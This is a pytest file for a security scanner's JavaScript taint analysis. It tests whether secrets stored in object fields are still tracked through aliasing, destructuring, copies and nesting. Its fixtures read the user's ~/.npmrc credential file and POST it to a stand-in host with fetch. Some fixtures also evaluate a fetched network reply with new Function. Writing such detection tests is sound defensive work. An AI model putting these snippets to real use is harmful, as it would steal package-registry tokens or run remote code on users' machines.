"""One level of field sensitivity in the JavaScript flow analysis (release item 59, notes/60, its review
section): `x.f = v` stores into x's field f, so a read of another field does not carry v, while every
way of using the object whole still does.

Fixtures name hosts under `.invalid`; nothing in them is run.
"""

from __future__ import annotations

from typing import ClassVar

import pytest

from cordon_scanner.analysis.javascript.js_flow import JsFlow


class FieldKit:
    #: A credential file read (secret_file) and a send (request), as in test_js_flow.py.
    HEAD: ClassVar[str] = (
        'const fs = require("fs");\n'
        'const secret = fs.readFileSync(require("os").homedir() + "/.npmrc");\n'
    )
    SEND: ClassVar[str] = 'fetch("https://a.invalid/u", {method: "POST", body: %s});\n'

    @staticmethod
    def sends(text: str) -> bool:
        return any(f.sink == "request" and "secret_file" in f.sources for f in JsFlow.flows(text))

    @staticmethod
    def runs_reply(text: str) -> bool:
        return any(
            f.sink == "execute" and "network_response" in f.sources for f in JsFlow.flows(text)
        )


class TestAnotherFieldIsNotTheStoredOne:
    SHAPE: ClassVar[str] = (
        "class Panel {\n"
        "  async load(url) {\n"
        "    const r = await fetch(url);\n"
        "    this.data = await r.json();\n"
        "  }\n"
        "  warn() {\n"
        '    show({ text: this.data.message, template: document.querySelector("#t") });\n'
        "  }\n"
        "}\n"
        "function show(opts) {\n"
        "  %s\n"
        "  return new Function(`return ${attr}`)();\n"
        "}\n"
    )

    def test_a_template_field_beside_a_reply_field_is_not_run(self) -> None:
        # The uikit-web shape (notes/60): the reply is stored on one field, another is evaluated.
        body = 'const attr = opts.template.getAttribute("value");'
        assert not FieldKit.runs_reply(self.SHAPE % body)

    def test_the_reply_field_itself_is_still_run(self) -> None:
        assert FieldKit.runs_reply(self.SHAPE % "const attr = opts.text;")

    def test_a_stored_field_and_another_read(self) -> None:
        text = FieldKit.HEAD + "const box = {};\nbox.key = secret;\n" + FieldKit.SEND % "box.name"
        assert not FieldKit.sends(text)

    def test_the_stored_field_read(self) -> None:
        text = FieldKit.HEAD + "const box = {};\nbox.key = secret;\n" + FieldKit.SEND % "box.key"
        assert FieldKit.sends(text)


class TestEveryWholeUseKeepsTheFlow:
    @pytest.mark.parametrize(
        "use",
        [
            "box",
            "JSON.stringify(box)",
            "{...box}",
            "Object.assign({}, box)",
            "structuredClone(box)",
        ],
    )
    def test_the_object_used_whole(self, use: str) -> None:
        text = FieldKit.HEAD + "const box = {};\nbox.key = secret;\n" + FieldKit.SEND % use
        assert FieldKit.sends(text)

    def test_a_computed_key_stays_whole_object(self) -> None:
        text = FieldKit.HEAD + 'const box = {};\nconst k = "key";\nbox[k] = secret;\n'
        assert FieldKit.sends(text + FieldKit.SEND % "box.other")


class TestTheFiveCasesThatMustKeepTheirFlows:
    """The outer layer's review of notes/60: each of these keeps its flow, or field sensitivity is
    the evasion."""

    def test_aliasing(self) -> None:
        text = (
            FieldKit.HEAD + "const x = {};\nconst y = x;\ny.f = secret;\n" + FieldKit.SEND % "x.f"
        )
        assert FieldKit.sends(text)

    @pytest.mark.parametrize("form", ["const {f} = x;\n", "let f;\n({f} = x);\n"])
    def test_destructuring(self, form: str) -> None:
        text = FieldKit.HEAD + "const x = {};\nx.f = secret;\n" + form + FieldKit.SEND % "f"
        assert FieldKit.sends(text)

    def test_this_across_methods(self) -> None:
        text = (
            FieldKit.HEAD
            + "class C {\n  keep() { this.f = secret; }\n  go() { "
            + FieldKit.SEND.strip() % "this.f"
            + " }\n}\n"
        )
        assert FieldKit.sends(text)

    @pytest.mark.parametrize(
        "copy", ["Object.assign(y, x)", "y = {...x}", "y = structuredClone(x)"]
    )
    def test_copies(self, copy: str) -> None:
        text = (
            FieldKit.HEAD
            + f"const x = {{}};\nx.f = secret;\nlet y = {{}};\n{copy};\n"
            + FieldKit.SEND % "y.f"
        )
        assert FieldKit.sends(text)

    def test_nesting(self) -> None:
        text = FieldKit.HEAD + "const x = {f: {}};\nx.f.g = secret;\n" + FieldKit.SEND % "x.f"
        assert FieldKit.sends(text)


class TestParameterFields:
    def test_a_helper_reading_another_field_of_its_argument(self) -> None:
        text = (
            FieldKit.HEAD
            + "function post(o) { "
            + FieldKit.SEND.strip() % "o.name"
            + " }\npost({ key: secret, name: 'n' });\n"
        )
        assert not FieldKit.sends(text)

    def test_a_helper_reading_the_tainted_field(self) -> None:
        text = (
            FieldKit.HEAD
            + "function post(o) { "
            + FieldKit.SEND.strip() % "o.key"
            + " }\npost({ key: secret, name: 'n' });\n"
        )
        assert FieldKit.sends(text)

    def test_an_argument_of_unknown_shape_is_whole(self) -> None:
        text = (
            FieldKit.HEAD
            + "function post(o) { "
            + FieldKit.SEND.strip() % "o.name"
            + " }\npost(secret);\n"
        )
        assert FieldKit.sends(text)
